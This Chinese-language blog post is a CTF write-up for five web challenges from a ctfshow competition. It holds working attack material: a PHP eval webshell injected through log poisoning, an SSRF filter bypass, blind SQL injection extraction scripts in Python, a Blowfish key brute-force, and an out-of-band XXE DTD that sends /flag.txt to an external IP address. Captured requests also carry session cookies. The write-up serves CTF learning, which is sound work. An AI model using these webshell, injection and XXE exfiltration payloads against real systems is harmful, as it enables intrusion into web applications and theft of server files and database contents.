+++
title = "ctfshowAK赛"
slug = "ctfshow-ak-competition"
description = "刷"
date = "2024-12-12T20:53:52"
lastmod = "2024-12-12T20:53:52"
image = ""
license = ""
categories = ["ctfshow"]
tags = ["mysql", "php", "xxe"]
+++

## 签到_观己

```php
<?php

if(isset($_GET['file'])){
    $file = $_GET['file'];
    if(preg_match('/php/i', $file)){
        die('error');
    }else{
        include($file);
    }

}else{
    highlight_file(__FILE__);
}

?>
```

包含日志文件即可

```http
POST /?file=/var/log/nginx/access.log HTTP/1.1
Host: c2ddfbf5-dccb-4ff8-935f-7f6f592a35ce.challenge.ctf.show
Cookie: cf_clearance=AlLJBGTvGfSx92Z2TE133nsC62L7ZvjHOaMdV6S5Ifc-1734007807-1.2.1.1-ed02RSpjUZJ.8wpVSw_bIQz63q.QPpBfjaeLr9UFebRdQn5K_pmp5RsNDNplRaoZ_7JJ2AC3WmVqUy__CtJPVKRmVhqj4cJ68UVKAUpxeeGs0aWMg49qQzPlywdx7ds.aX9a0osPl_qYm8smseceZmGH21Hiv4lMUmEN8elAGnKbYBXsRTvTc.ojeUDWAFXqq3.zWrK.keENkxpeYJOyvuSYm5mtdIX7ZmaYnVnH8WgesxHgiDfjdD88DrdCPxjmE26q6UYRfoPynd1HbNlMjlQ94qWtLp5zIvRKo8ZJd3y9Fv7j9fa4HHZPB90CrOyllJwZGzWb0DfSSSvIRAkSDQXgkHoIjIA.KQpfAWgYRdSUMLXN9mIrjR0zFOCaEKuD
Content-Length: 38
Pragma: no-cache
Cache-Control: no-cache
Sec-Ch-Ua: "Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Origin: https://c2ddfbf5-dccb-4ff8-935f-7f6f592a35ce.challenge.ctf.show
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36;<?php eval($_POST[1]);?>
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-Dest: document
Referer: https://c2ddfbf5-dccb-4ff8-935f-7f6f592a35ce.challenge.ctf.show/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Priority: u=0, i
Connection: close

1=system%28%22tac+%2Fflag.txt%22%29%3B
```

## web1_观字

```php
<?php

#flag in http://192.168.7.68/flag
if(isset($_GET['url'])){
    $url = $_GET['url'];
    $protocol = substr($url, 0,7);
    if($protocol!='http://'){
        die('仅限http协议访问');
    }
    if(preg_match('/\.|\;|\||\<|\>|\*|\%|\^|\(|\)|\#|\@|\!|\`|\~|\+|\'|\"|\.|\,|\?|\[|\]|\{|\}|\!|\&|\$|0/', $url)){
        die('仅限域名地址访问');
    }
    system('curl '.$url);
}
```

直接句号绕过就可以了

```
https://4ab842e8-5588-4bee-a574-e01f963ef429.challenge.ctf.show/?url=http://192。168。7。68/flag
```

## web2_观星

发现没啥东西，当时这个id有点可疑，先扫一下吧

```
[08:12:48] 200 -  407B  - /eam/vib?id=/etc/issue
[08:12:53] 200 -  407B  - /gotoURL.asp?url=google.com&id=43569
```

这两个就是文章列表没啥用啊，idFUZZ一下，这里有三篇文章有个特性就是，总共三篇文章我们尝试注入如果，是不同的文章的以此来盲注

```
id=2^0
A Child's Dream of a Star
id=2^1
I asked nothing
```

然后这里我们来注入即可，FUZZ出来黑名单，过滤的还是挺多的

```
ord代替ascii
,用from for 绕过
=用regexp
```

```
2^case(ord(substr(database()from(1)for(1))))when(117)then(1)else(0)end
```

```python
import requests
url="http://2d57ffbf-cf4a-4166-b745-a1b0556dc371.node5.buuoj.cn:81/index.php"

target=""
i=0
while True:
    head = 127
    tail = 32
    i+=1
    while tail<head:
        mid=(head+tail)//2
        payload=f"2^case(ord(substr(database()from({i})for(1))))when({mid})then(1)else(0)end"
        r=requests.get(url=url,params={"id":payload})
        if "I asked nothing" in r.text:
            tail=mid+1
        else:
            head=mid
    if tail!=32:
        target+=chr(tail)
        print(chr(tail))
    else:
        break
    print(f"\r{target}", end='')

```

类似的写了一个二分法，但是后面仔细想想发现这个东西只能遍历，因为使用了case when

```python
import sys

import requests
url="http://a8a737ca-7a82-43bc-80e3-ab397f575124.challenge.ctf.show/index.php?id="

target=""
for i in range(1,50):
    found =False
    for j in range(32,127):
        # payload=f"2^case(ord(substr(database()from({i})for(1))))when({j})then(1)else(0)end"
        # web1
        # payload=f"2^case(ord(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)regexp(database()))from({i})for(1))))when({j})then(1)else(0)end"
        # flag,page,user
        # payload = f"2^case(ord(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name)regexp(0x666c6167))from({i})for(1))))when({j})then(1)else(0)end"
        # FLAG_COLUMN, flag
        payload = f"2^case(ord(substr((select(flag)from(flag))from({i})for(1))))when({j})then(1)else(0)end"

        payload=url+payload
        # print(payload)
        r=requests.get(url=payload)
        if "I asked nothing" in r.text:
            found=True
            target+=chr(j)
            print(chr(j))
            print(f"\r{target}", end='')
            break
    if not found:
        sys.exit()
print(target)

```

就是很慢，而且我也不好加多线程，于是就是慢慢等了，并且延时了容器

## web3_观图

查看源码拿到路由，先读文件，我就直接猜是base64编码了，诶好像不对，那把路径拿掉看看能不能有，发现可以

```php
// showImage.php
<?php

//$key = substr(md5('ctfshow'.rand()),3,8);
//flag in config.php
include('config.php');
if(isset($_GET['image'])){
    $image=$_GET['image'];
    $str = openssl_decrypt($image, 'bf-ecb', $key);
    if(file_exists($str)){
        header('content-type:image/gif');
        echo file_get_contents($str);
    }
}else{
    highlight_file(__FILE__);
}
?>
```

有个解密函数，是PHP内置的用来解决OpenSSL算法的，但是这里使用rand()函数来生成随机数，但是任意数最大才为32768，key是可以被爆破的，写个exp

```php
<?php
for($i=0;$i<32768;$i++){
    $key=substr(md5('ctfshow'.$i),3,8);
    $image="Z6Ilu83MIDw=";
    $str = openssl_decrypt($image, 'bf-ecb', $key);
    if(strpos($str,"gif") or strpos($str,"jpg") or strpos($str,"png")){
        print $i;
        break;
    }
}
```

那么加密拿到文件

```php
<?php
$key = substr(md5('ctfshow'.'27347'),3,8);
//echo $key;
$image="config.php";
$str = openssl_encrypt($image, 'bf-ecb', $key);
echo $str;
```

## web4_观心

这个占卜好像是个恒真的式子？我测了两次都是对的，源码里面提示了flag在/flag.txt，所以应该是有地方能进行文件读取的，不然扫F12看看有没有什么东西，还是没看到啥，占卜的时候抓包得到了东西

```http
POST /api.php HTTP/1.1
Host: 7521abe5-d24f-40f0-9ab3-502de131ce54.challenge.ctf.show
Cookie: cf_clearance=AlLJBGTvGfSx92Z2TE133nsC62L7ZvjHOaMdV6S5Ifc-1734007807-1.2.1.1-ed02RSpjUZJ.8wpVSw_bIQz63q.QPpBfjaeLr9UFebRdQn5K_pmp5RsNDNplRaoZ_7JJ2AC3WmVqUy__CtJPVKRmVhqj4cJ68UVKAUpxeeGs0aWMg49qQzPlywdx7ds.aX9a0osPl_qYm8smseceZmGH21Hiv4lMUmEN8elAGnKbYBXsRTvTc.ojeUDWAFXqq3.zWrK.keENkxpeYJOyvuSYm5mtdIX7ZmaYnVnH8WgesxHgiDfjdD88DrdCPxjmE26q6UYRfoPynd1HbNlMjlQ94qWtLp5zIvRKo8ZJd3y9Fv7j9fa4HHZPB90CrOyllJwZGzWb0DfSSSvIRAkSDQXgkHoIjIA.KQpfAWgYRdSUMLXN9mIrjR0zFOCaEKuD
Content-Length: 68
Sec-Ch-Ua-Platform: "Windows"
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36
Accept: application/json, text/javascript, */*; q=0.01
Sec-Ch-Ua: "Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Sec-Ch-Ua-Mobile: ?0
Origin: https://7521abe5-d24f-40f0-9ab3-502de131ce54.challenge.ctf.show
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://7521abe5-d24f-40f0-9ab3-502de131ce54.challenge.ctf.show/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Priority: u=0, i
Connection: close

api=http%3A%2F%2Fflash.weather.com.cn%2Fwmaps%2Fxml%2Fcity.xml&city=
```

这个文档不能curl，貌似类似一个图床？，但是可以确定的是会加载我们的xml文档直接打就可以了

```dtd
<!ENTITY % file SYSTEM "file:///flag.txt">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://156.238.233.9:9999/?x=%file;'>">
%eval;
%exfiltrate;
```

```xml
<?xml  version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://156.238.233.9/b.dtd">%xxe;]>
<foo></foo>
```

然后好像也不用监听报错看到他是使用的loadXML()函数，所以页面就有flag

```http
POST /api.php HTTP/1.1
Host: 7521abe5-d24f-40f0-9ab3-502de131ce54.challenge.ctf.show
Cookie: cf_clearance=AlLJBGTvGfSx92Z2TE133nsC62L7ZvjHOaMdV6S5Ifc-1734007807-1.2.1.1-ed02RSpjUZJ.8wpVSw_bIQz63q.QPpBfjaeLr9UFebRdQn5K_pmp5RsNDNplRaoZ_7JJ2AC3WmVqUy__CtJPVKRmVhqj4cJ68UVKAUpxeeGs0aWMg49qQzPlywdx7ds.aX9a0osPl_qYm8smseceZmGH21Hiv4lMUmEN8elAGnKbYBXsRTvTc.ojeUDWAFXqq3.zWrK.keENkxpeYJOyvuSYm5mtdIX7ZmaYnVnH8WgesxHgiDfjdD88DrdCPxjmE26q6UYRfoPynd1HbNlMjlQ94qWtLp5zIvRKo8ZJd3y9Fv7j9fa4HHZPB90CrOyllJwZGzWb0DfSSSvIRAkSDQXgkHoIjIA.KQpfAWgYRdSUMLXN9mIrjR0zFOCaEKuD
Content-Length: 45
Pragma: no-cache
Cache-Control: no-cache
Sec-Ch-Ua: "Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Origin: https://7521abe5-d24f-40f0-9ab3-502de131ce54.challenge.ctf.show
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://7521abe5-d24f-40f0-9ab3-502de131ce54.challenge.ctf.show/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Priority: u=0, i
Connection: close

api=http%3A%2F%2F156.238.233.9%2Fb.xml&city=1
```

